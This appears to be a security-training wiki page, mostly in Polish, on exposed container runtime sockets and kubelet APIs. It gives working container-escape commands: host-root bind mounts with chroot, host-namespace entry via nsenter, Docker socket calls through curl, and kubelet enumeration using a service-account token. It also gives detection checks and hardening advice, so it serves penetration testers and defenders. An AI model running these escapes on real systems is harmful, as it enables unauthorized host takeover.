# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Wiele realnych compromise kontenera w ogóle nie zaczyna się od namespace escape. Zaczynają się od dostępu do runtime control plane. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podman lub kubelet przez zamontowany Unix socket albo exposed TCP listener, attacker może być w stanie zażądać nowego kontenera z lepszymi uprawnieniami, zamontować host filesystem, dołączyć do host namespaces albo pobrać wrażliwe informacje o node. W takich przypadkach runtime API jest prawdziwą granicą bezpieczeństwa, a compromise jego jest funkcjonalnie bliskie compromise hosta.

Dlatego runtime socket exposure powinno być dokumentowane osobno od kernel protections. Kontener ze zwykłym seccomp, capabilities i MAC confinement nadal może być o jedno wywołanie API od host compromise, jeśli `/var/run/docker.sock` albo `/run/containerd/containerd.sock` jest w nim zamontowany. Kernel isolation obecnego kontenera może działać dokładnie tak, jak zaprojektowano, podczas gdy runtime management plane pozostaje w pełni exposed.

## Daemon Access Models

Docker Engine tradycyjnie exposes swoje uprzywilejowane API przez lokalny Unix socket pod `unix:///var/run/docker.sock`. Historycznie był też exposed zdalnie przez TCP listeners takie jak `tcp://0.0.0.0:2375` albo TLS-protected listener na `2376`. Exposing daemona zdalnie bez silnego TLS i client authentication praktycznie zamienia Docker API w zdalny root interface.

containerd, CRI-O, Podman i kubelet expose podobne surfaces o wysokim impact. Nazwy i workflow różnią się, ale logika nie. Jeśli interface pozwala callerowi tworzyć workloads, montować host paths, pobierać credentials albo zmieniać działające kontenery, to jest to uprzywilejowany kanał management i należy go tak traktować.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej specjalistyczne stacki mogą też ujawniać endpointy takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne w nowoczesnych środowiskach, ale gdy zostaną napotkane, należy traktować je z taką samą ostrożnością, ponieważ stanowią powierzchnie kontroli runtime, a nie zwykłe sockety aplikacyjne.

## Secure Remote Access

Jeśli daemon musi być wystawiony poza lokalny socket, połączenie powinno być chronione przez TLS i najlepiej z mutual authentication, tak aby daemon weryfikował klienta, a klient weryfikował daemon. Stary zwyczaj otwierania Docker daemon na zwykłym HTTP dla wygody jest jednym z najbardziej niebezpiecznych błędów w administrowaniu kontenerami, ponieważ powierzchnia API jest na tyle silna, że może bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczny wzorzec konfiguracji Docker wyglądał tak:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd, komunikacja z daemon może również pojawiać się jako `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket od systemd zamiast wiązać go bezpośrednio samodzielnie. Ważna lekcja nie dotyczy dokładnej składni, lecz konsekwencji bezpieczeństwa. W momencie, gdy daemon nasłuchuje poza ściśle chronionym lokalnym socket, security transportu i client authentication stają się obowiązkowe, a nie opcjonalnym hardening.

## Abuse

Jeśli obecny jest runtime socket, potwierdź, który to jest, czy istnieje kompatybilny client oraz czy możliwy jest dostęp przez raw HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Te komendy są przydatne, ponieważ pozwalają odróżnić martwy path, zamontowany, ale niedostępny socket, oraz aktywne uprzywilejowane API. Jeśli client się powiedzie, kolejne pytanie brzmi, czy API może uruchomić nowy container z host bind mount albo współdzieleniem host namespace.

### Gdy nie jest zainstalowany żaden client

Brak `docker`, `podman` ani innego przyjaznego CLI nie oznacza, że socket jest bezpieczny. Docker Engine komunikuje się po HTTP przez swój Unix socket, a Podman udostępnia zarówno API zgodne z Dockerem, jak i natywne API Libpod przez `podman system service`. To oznacza, że minimalne środowisko z samym `curl` może nadal wystarczyć do sterowania daemonem:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasem usuwają zwykłe binaria klienta, ale pozostawiają zamontowany socket zarządzania. Na hostach Podman pamiętaj, że ścieżka o wysokiej wartości różni się między wdrożeniami rootful i rootless: `unix:///run/podman/podman.sock` dla rootful service instances oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla rootless.

### Full Example: Docker Socket To Host Root

Jeśli `docker.sock` jest osiągalny, klasyczne escape polega na uruchomieniu nowego kontenera, który montuje host root filesystem, a następnie wykonaniu `chroot` do niego:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Zapewnia to bezpośrednie wykonanie jako host-root przez Docker daemon. Wpływ nie ogranicza się do odczytu plików. Po wejściu do nowego kontenera atakujący może modyfikować pliki hosta, zbierać credentials, wdrożyć persistence lub uruchomić dodatkowe uprzywilejowane workloads.

### Full Example: Docker Socket To Host Namespaces

Jeśli atakujący woli wejście do namespace zamiast dostępu tylko do filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka osiąga host, prosząc runtime o utworzenie nowego container z jawnie ujawnionym host-namespace, zamiast wykorzystywać obecny.

### Full Example: containerd Socket

Zamontowany socket `containerd` jest zwykle równie niebezpieczny:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Jeśli jest dostępny bardziej Docker-podobny klient, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Wpływ to ponownie compromise hosta. Nawet jeśli nie ma narzędzi specyficznych dla Docker, inne runtime API może nadal oferować tę samą moc administracyjną. Na node Kubernetes, `crictl` może też wystarczyć do reconnaissance i interakcji z kontenerami, ponieważ mówi bezpośrednio do endpointu CRI.

### BuildKit Socket

`buildkitd` łatwo przeoczyć, ponieważ ludzie często myślą o nim jako o „po prostu backendzie builda”, ale daemon nadal jest uprzywilejowanym control plane. Osiągalny `buildkitd.sock` może pozwolić attackerowi uruchamiać dowolne kroki builda, inspectować możliwości workerów, używać local contexts z compromised środowiska i requestować niebezpieczne entitlements, takie jak `network.host` lub `security.insecure`, jeśli daemon został skonfigurowany tak, by na to pozwalać.

Przydatne pierwsze interakcje to:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Jeśli daemon akceptuje żądania build, przetestuj, czy dostępne są insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Dokładny wpływ zależy od konfiguracji daemon, ale rootful BuildKit service z permissive entitlements nie jest niewinną wygodą dla developerów. Traktuj go jak kolejną, wysokowartościową powierzchnię administracyjną, szczególnie na CI runners i współdzielonych build nodes.

### Kubelet API Over TCP

kubelet nie jest container runtime, ale nadal jest częścią node management plane i często mieści się w tej samej dyskusji o trust boundary. Jeśli secure port kubelet `10250` jest osiągalny z workload, albo jeśli node credentials, kubeconfigs lub proxy rights są exposed, atakujący może być w stanie enumerate Pods, pobierać logs lub execute commands w node-local containers bez dotykania ścieżki admission Kubernetes API server.

Zacznij od cheap discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Jeśli ścieżka proxy kubelet lub API-server autoryzuje `exec`, klient obsługujący WebSocket może zamienić to na wykonanie kodu w innych kontenerach na node. To także dlatego `nodes/proxy` z samym uprawnieniem `get` jest bardziej niebezpieczne, niż brzmi: żądanie nadal może dotrzeć do endpointów kubelet, które wykonują polecenia, a te bezpośrednie interakcje z kubelet nie pojawiają się w zwykłych logach audytu Kubernetes.

## Checks

Celem tych checks jest odpowiedź na pytanie, czy kontener może dotrzeć do jakiejkolwiek management plane, która powinna pozostać poza trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Co jest tutaj interesujące:

- Podmontowany runtime socket zwykle jest bezpośrednim primitive administracyjnym, a nie zwykłym ujawnieniem informacji.
- TCP listener na `2375` bez TLS powinien być traktowany jako warunek zdalnego przejęcia.
- Zmienne środowiskowe takie jak `DOCKER_HOST` często ujawniają, że workload był celowo zaprojektowany do komunikacji z host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
